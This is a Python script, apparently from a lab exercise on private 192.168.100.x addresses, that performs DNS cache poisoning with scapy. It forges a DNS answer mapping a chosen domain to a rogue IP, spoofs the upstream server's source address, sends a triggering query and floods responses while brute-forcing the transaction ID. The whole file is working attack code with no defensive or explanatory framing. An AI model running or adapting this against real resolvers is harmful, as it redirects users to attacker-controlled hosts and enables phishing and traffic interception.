from scapy.all import *
import sys

def main():
    # Command line argument check
    if len(sys.argv) < 3:
        print("Usage: attack.py [victim_fqdn] [rogue_ip_address]")
        sys.exit(1)
    
    # Configuration parameters
    victim_fqdn = sys.argv[1]           # The domain we want to hijack
    rogue_ip_address = sys.argv[2]      # The malicious IP to inject into cache
    
    vulnerable_dns_server = "192.168.100.2" # The DNS cache server we are attacking
    server_service_port = 7777          # Port where the cache service listens
    impersonated_src_ip = "192.168.100.5"   # The legitimate server IP we are pretending to be
    standard_dns_port = 53              # Standard DNS port
    
    # =========================================================================
    # CONSTRUCTING THE SPOOFED RESPONSE (THE "POISON")
    # =========================================================================
    
    # IP Header
    ip_header = IP(
        dst=vulnerable_dns_server,  # Destination: The server we want to poison
        src=impersonated_src_ip     # Source: We pretend to be the upstream server
    )
    
    # UDP Header
    udp_header = UDP(
        dport=server_service_port,  # Destination port: The vulnerable service
        sport=standard_dns_port     # Source port: Coming from port 53
    )
    
    # DNS Query section (The question we are answering)
    dns_question = DNSQR(
        qname=victim_fqdn
    )
    
    # DNS Answer section (The fake answer)
    dns_answer = DNSRR(
        rrname=victim_fqdn,         # The domain matching the question
        type='A',                   # Record type A
        ttl=3600,                   # Time to live
        rdata=rogue_ip_address      # The malicious IP
    )
    
    # Main DNS Header
    dns_header = DNS(
        id=0,           # Transaction ID (to be brute-forced)
        qr=1,           # Response flag
        qd=dns_question,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        an=dns_answer
    )
    
    # Assemble the poison packet
    poison_packet = ip_header / udp_header / dns_header
    
    # =========================================================================
    # CONSTRUCTING THE TRIGGER REQUEST
    # =========================================================================
    
    # This header requests the domain to force the server to open a transaction
    trigger_dns_header = DNS(
        id=500,         # ID for our own request (irrelevant for the attack)
        qr=0,           # Query flag
        rd=1,           # Recursion Desired
        qdcount=1,
        qd=DNSQR(
            qname=victim_fqdn,
            qtype="A",
            qclass="IN"
        )
    )
    
    trigger_packet = IP(dst=vulnerable_dns_server) / UDP(dport=standard_dns_port) / trigger_dns_header
    
    # =========================================================================
    # EXECUTING THE ATTACK
    # =========================================================================
    
    # 1. Send the poison packet first (race condition attempt)
    send(poison_packet, verbose=0)
    print("Initial poison packet sent")
    
    # 2. Send the trigger packet (causes server to ask the upstream)
    send(trigger_packet, verbose=0)
    print("Trigger packet sent to initiate cache lookup")
    
    # 3. Flood with different Transaction IDs to guess the correct one
    print("Flooding with transaction ID brute-force...")
    for tx_id in range(0, 50):
        poison_packet[DNS].id = tx_id  # Update Transaction ID
        send(poison_packet, verbose=0)
    
    print(f"Attack sequence finished!")
    print(f"Attempted to map: {victim_fqdn} -> {rogue_ip_address}")
    print(f"Target: {vulnerable_dns_server}:{server_service_port}")

if __name__ == "__main__":
    main()